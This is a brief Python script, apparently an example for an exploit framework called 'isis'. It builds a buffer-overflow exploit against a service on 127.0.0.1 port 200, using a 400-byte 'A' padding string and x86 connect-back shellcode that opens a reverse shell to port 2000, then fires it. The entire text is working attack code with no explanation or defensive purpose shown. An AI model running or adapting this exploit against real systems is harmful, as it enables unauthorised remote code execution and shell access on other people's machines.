from isis import *

exploit = Exploit('127.0.0.1', 200, 'connectback')
exploit.connect_back('127.0.0.1', 2000)

exploit.prepare('A'*400)
exploit.generate('x86')

exploit.display()

exploit.throw()